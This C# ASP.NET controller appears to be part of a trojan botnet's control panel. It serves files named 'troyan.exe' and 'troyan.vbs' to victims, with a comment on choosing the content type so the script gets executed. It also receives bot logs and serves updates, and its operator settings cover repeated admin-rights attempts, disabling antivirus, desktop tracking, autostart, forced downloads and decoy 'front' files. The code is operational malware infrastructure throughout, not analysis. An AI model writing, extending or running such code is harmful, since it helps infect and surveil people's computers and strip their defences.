using Commons;
using cp.Models;
using Domain;
using Microsoft.AspNetCore.Mvc;
using Microsoft.Extensions.Caching.Memory;
using model;

namespace cp.Controllers;

[Route("")]
public class CpController : BaseController
{
    private readonly IServiceProvider _serviceProvider;
    private readonly BotController _botController;
    private readonly IDomainHostsChangedSignal _hostsChanged;

    public CpController(
        ServerService serverService,
        BotController botController,
        IServiceProvider serviceProvider,
        IConfiguration configuration,
        IMemoryCache memoryCache,
        IDomainHostsChangedSignal hostsChanged) : base(serverService, configuration, memoryCache)
    {
        _serviceProvider = serviceProvider;
        _botController = botController;
        _hostsChanged = hostsChanged;
    }

    [HttpGet]
    public IActionResult Index()
    {
        var server = Server;
        if (server == "favicon.ico")
            return NotFound();
        try
        {
            var serverResult = _serverService.GetServerHard();
            ViewData["UrlDoc"] = serverResult.ServerModel?.UrlDoc != null ? serverResult.ServerModel.UrlDoc : "";
            if (serverResult.ServerModel == null)
                return NotFound();
            return View("Index", new CpIndexViewModel { Server = serverResult.ServerModel });
        }
        catch (Exception e)
        {
            var err = new ServerModel { Server = server, PostModel = new PostModel { LastResult = e.Message + "\r\n" + e.StackTrace } };
            err.PanelHomeDirectory = _serverService.Paths.UserDataDir;
            return View("Index", new CpIndexViewModel { Server = err });
        }
    }

    [HttpGet("/GetIcon")]
    public IActionResult GetIcon()
    {
        try
        {
            var server = Server;
            if (!System.IO.File.Exists(_serverService.GetIconPath()))
                return NotFound();
            var fileBytes = System.IO.File.ReadAllBytes(_serverService.GetIconPath());
            Response.Headers.Add("Content-Type", "image/x-icon");
            return File(fileBytes, "image/x-icon");
        }
        catch (Exception)
        {
            return StatusCode(500, "Internal server error");
        }
    }

    protected IActionResult GetFile(string serverFile, string fileName)
    {
        try
        {
            if (!System.IO.File.Exists(serverFile))
                return NotFound();
            var fileBytes = System.IO.File.ReadAllBytes(serverFile);
            Response.Headers.Add("Content-Type", "application/octet-stream");
            return File(fileBytes, "application/octet-stream", fileName.Split(".")[0] + "_" + Environment.TickCount.ToString() + "." + fileName.Split(".")[1] );
        }
        catch (Exception)
        {
            return StatusCode(500, "Internal server error");
        }
    }

    [HttpGet("/GetExe")]
    public IActionResult GetExe()
    {
        return GetFile(_serverService.GetExePath(), "troyan.exe");
    }

    [HttpGet("/GetVbs")]
    public IActionResult GetVbs() => TroyanVbsFromUserData();

    [HttpGet("/{profile}/{random}/{target}/GetVbs")]
    public IActionResult GetVbsLegacy(string profile, string random, string target) => TroyanVbsFromUserData();

    IActionResult TroyanVbsFromUserData()
    {
        var path = _serverService.Layout().UserTroyanVbs;
        if (!System.IO.File.Exists(path))
            return NotFound();
        // text/plain makes browsers render the payload in-tab instead of downloading; WSH never runs it.
        return PhysicalFile(path, "application/octet-stream", "troyan.vbs");
    }

    [HttpPost]
    public IActionResult IndexWithServer(
        ServerModel updatedModel,
        string action,
        IFormFile iconFile,
        List<IFormFile> newEmbeddings,
        List<IFormFile> newFront)
    {
        var server = Server;
        try
        {
            var existingModel = _serverService.GetServerHard().ServerModel;
            if (existingModel == null)
            {
                return NotFound();
            }
            updatedModel.Server = server;

            if (action == "reboot")
            {
                var res = _serverService.Reboot();
                var vm = new ServerModel { Server = server, PostModel = new PostModel { LastResult = res } };
                vm.PanelHomeDirectory = _serverService.Paths.UserDataDir;
                return View("Index", new CpIndexViewModel { Server = vm });
            }

            if (action == "clearstats")
            {
                _serviceProvider.GetRequiredService<StatsController>().ClearStats();
                return View("Index", new CpIndexViewModel { Server = existingModel });
            }

            // CP apply: legacy "exe" / empty maps to apply; work runs in hosted services (not awaited on this thread).
            if (!string.Equals(action, "reboot", StringComparison.OrdinalIgnoreCase)
                && !string.Equals(action, "clearstats", StringComparison.OrdinalIgnoreCase))
            {
                if (string.IsNullOrWhiteSpace(action)
                    || string.Equals(action, "exe", StringComparison.OrdinalIgnoreCase))
                    action = "apply";
            }

            if (newEmbeddings != null && newEmbeddings.Count > 0)
            {
                foreach (var file in newEmbeddings)
                {
                    var filePath = _serverService.GetEmbeddingPath(file.FileName);
                    if (!Directory.Exists(_serverService.EmbeddingsDir))
                        Directory.CreateDirectory(_serverService.EmbeddingsDir);
                    using (var stream = new FileStream(filePath, FileMode.Create))
                    {
                        file.CopyTo(stream);
                    }

                    updatedModel.Embeddings.Add(file.FileName);
                }
            }

            var toDeleteEmbeddings = existingModel.Embeddings.Where(a => !updatedModel.Embeddings.Contains(a));
            foreach (var file in toDeleteEmbeddings)
                _serverService.DeleteEmbedding(file);


            if (newFront != null && newFront.Count > 0)
            {
                foreach (var file in newFront)
                {
                    var filePath = _serverService.GetFrontPath(file.FileName);
                    if (!Directory.Exists(_serverService.FrontDir))
                        Directory.CreateDirectory(_serverService.FrontDir);
                    using (var stream = new FileStream(filePath, FileMode.Create))
                    {
                        file.CopyTo(stream);
                    }

                    updatedModel.Front.Add(file.FileName);
                }
            }

            var toDeleteFront = existingModel.Front.Where(a => !updatedModel.Front.Contains(a));
            foreach (var file in toDeleteFront)
                _serverService.DeleteFront(file);


            if (iconFile != null && iconFile.Length > 0)
            {
                var filePath = _serverService.GetIconPath();

                using (var stream = new FileStream(filePath, FileMode.Create))
                {
                    iconFile.CopyTo(stream);
                }
            }

            updatedModel.Pushes = updatedModel.Pushes
                .Where(a => !string.IsNullOrEmpty(a))
                .SelectMany(a => a.Split(Environment.NewLine))
                .Where(a => !string.IsNullOrEmpty(a))
                .Select(a => a.Trim()).Where(a => !string.IsNullOrEmpty(a)).ToList();

            updatedModel.StartUrls = updatedModel.StartUrls
                .Where(a => !string.IsNullOrEmpty(a))
                .SelectMany(a => a.Split(Environment.NewLine))
                .Where(a => !string.IsNullOrEmpty(a))
                .Select(a => a.Trim()).Where(a => !string.IsNullOrEmpty(a)).ToList();

            updatedModel.StartDownloads= updatedModel.StartDownloads
                .Where(a => !string.IsNullOrEmpty(a))
                .SelectMany(a => a.Split(Environment.NewLine))
                .Where(a => !string.IsNullOrEmpty(a))
                .Select(a => a.Trim()).Where(a => !string.IsNullOrEmpty(a)).ToList();

            updatedModel.StartDownloadsBack ??= new List<string>();
            updatedModel.StartDownloadsBack = updatedModel.StartDownloadsBack
                .Where(a => !string.IsNullOrEmpty(a))
                .SelectMany(a => a.Split(Environment.NewLine))
                .Where(a => !string.IsNullOrEmpty(a))
                .Select(a => a.Trim()).Where(a => !string.IsNullOrEmpty(a)).ToList();


            existingModel.UrlDoc = updatedModel.UrlDoc;
            existingModel.Server = server;
            existingModel.ServerIp = updatedModel.ServerIp;
            existingModel.PrimaryDns = updatedModel.PrimaryDns;
            existingModel.SecondaryDns = updatedModel.SecondaryDns;
            existingModel.Alias = updatedModel.Alias;
            existingModel.StrahServer = updatedModel.StrahServer;
            existingModel.Track = updatedModel.Track;
            existingModel.TrackSerie = updatedModel.TrackSerie;
            existingModel.TrackDesktop = updatedModel.TrackDesktop;
            existingModel.AutoStart = updatedModel.AutoStart;
            existingModel.AutoUpdate = updatedModel.AutoUpdate;
            existingModel.AggressiveAdmin = updatedModel.AggressiveAdmin;
            existingModel.AggressiveAdminDelay = updatedModel.AggressiveAdminDelay;
            existingModel.AggressiveAdminAttempts = updatedModel.AggressiveAdminAttempts;
            existingModel.AggressiveAdminTimes = updatedModel.AggressiveAdminTimes;
            existingModel.PushesForce = updatedModel.PushesForce;
            existingModel.Pushes = updatedModel.Pushes;
            existingModel.StartUrlsForce = updatedModel.StartUrlsForce;
            existingModel.StartUrls = updatedModel.StartUrls;
            existingModel.StartDownloadsForce = updatedModel.StartDownloadsForce;
            existingModel.StartDownloads = updatedModel.StartDownloads;
            existingModel.StartDownloadsBackForce = updatedModel.StartDownloadsBackForce;
            existingModel.StartDownloadsBack = updatedModel.StartDownloadsBack;
            existingModel.FrontForce = updatedModel.FrontForce;
            existingModel.Front = updatedModel.Front;
            existingModel.ExtractIconFromFront = updatedModel.ExtractIconFromFront;
            existingModel.EmbeddingsForce = updatedModel.EmbeddingsForce;
            existingModel.Embeddings = updatedModel.Embeddings;
            existingModel.LandingFtp = updatedModel.LandingFtp;
            existingModel.LandingAuto = updatedModel.LandingAuto;
            existingModel.LandingName = updatedModel.LandingName;

            existingModel.Bux = updatedModel.Bux;
            existingModel.DnSponsor = updatedModel.DnSponsor;
            existingModel.DisableVirus = updatedModel.DisableVirus;


            var result = _serverService.PostServerRequest(existingModel, action);
            // Persist only here; DNS / catalog / Troyan builds run in Refiner + DomainCatalogRefresh hosted loops (wake below).
            if (result == "OK")
                _hostsChanged.NotifyHostsChanged();

            existingModel.PostModel.LastResult = result;
            return View("Index", new CpIndexViewModel { Server = existingModel });
        }
        catch (Exception e)
        {
            var err = new ServerModel { Server = server, PostModel = new PostModel { LastResult = e.Message + "\r\n" + e.StackTrace } };
            err.PanelHomeDirectory = _serverService.Paths.UserDataDir;
            return View("Index", new CpIndexViewModel { Server = err });
        }
    }

        [HttpGet("/{profile}/{random}/{target}/DnLog")]
    public async Task<IActionResult> DnLog(string profile, string random, string target)
    {
        return await _botController.DnLog(profile, random, target);
    }

    [HttpPost("/upsert")]
    [Consumes("application/json")]
    [Produces("application/json")]
    public async Task<IActionResult> UpsertBotLog([FromHeader(Name = "X-Signature")] string xSignature, [FromBody] EnvelopeRequest request)
    {
        return await _botController.UpsertBotLog(Server,IpAddress, xSignature, request);
    }

    [HttpGet("/update")]
    public IActionResult Update()
    {
        return _botController.Update(Server);
    }
}
